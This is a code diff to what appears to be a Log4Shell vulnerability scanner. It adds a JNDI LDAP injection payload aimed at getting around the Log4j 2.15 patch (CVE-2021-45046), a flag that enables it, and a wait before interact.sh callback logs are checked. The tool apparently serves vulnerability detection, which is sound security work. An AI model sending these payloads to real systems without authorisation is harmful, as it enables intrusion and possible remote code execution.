@@ -28,6 +28,7 @@ except Exception:
     pass
 
 DEFAULT_PAYLOADS = ["${jndi:ldap://{{URI}}}"]
+BYPASS_2_15_PAYLOADS = ["${jndi:ldap://127.0.0.1#{{URI}}}"]
 DEFAULT_URI = "{{HOST}}/{{ID}}"
 INTERACTSH_SERVER = "interact.sh"
 INTERACTSH_REGEX = re.compile("(\w)+\.\w+")
@@ -160,10 +161,6 @@ def get_arguments():
                         help="request timeout [default: 10]",
                         dest="timeout",
                         type=int)
-    parser.add_argument("-v", "--verbose",
-                        action="store_true",
-                        dest="verbose",
-                        help="verbose logging")
     parser.add_argument("--headers-file",
                         action="store",
                         dest="headers",
@@ -184,6 +181,20 @@ def get_arguments():
                         dest="uri",
                         help="define custom URI format",
                         default=DEFAULT_URI)
+    parser.add_argument("--bypass-2-15",
+                        dest="bypass215",
+                        help="try bypass 2.15 fix using payload for CVE-2021-45046",
+                        action='store_true')
+    parser.add_argument("-w", "--wait-time",
+                        action="store",
+                        dest="wait_time",
+                        default=5,
+                        type=int,
+                        help="seconds to wait after all endpoints are tested before verifying vulnerable servers")
+    parser.add_argument("-v", "--verbose",
+                        action="store_true",
+                        dest="verbose",
+                        help="verbose logging")
     test_group = parser.add_argument_group("Tests", "[default: Headers, Query, Path]")
     test_group.add_argument("--headers",
                             action="append_const",
@@ -206,7 +217,7 @@ def get_arguments():
     if args.payload_file:
         args.payloads = read_file_rows(args.payload_file)
     if not args.payloads:
-        args.payloads = DEFAULT_PAYLOADS
+        args.payloads = BYPASS_2_15_PAYLOADS if args.bypass215 else DEFAULT_PAYLOADS
     return args
 
 
@@ -359,6 +370,9 @@ def execute_interactsh(mappings, args):
 
     print()
     cprint("[*] Start verification", color="cyan", attrs=["bold", "underline"])
+    cprint(f"[*] Waiting {args.wait_time} seconds", color="blue")
+    time.sleep(args.wait_time)
+    cprint("[*] Pulling logs", color="blue")
     logs = service.poll()
     ids = {log["full-id"].split(".")[0] for log in logs if
            log["full-id"] is not None and INTERACTSH_REGEX.match(log["full-id"])}
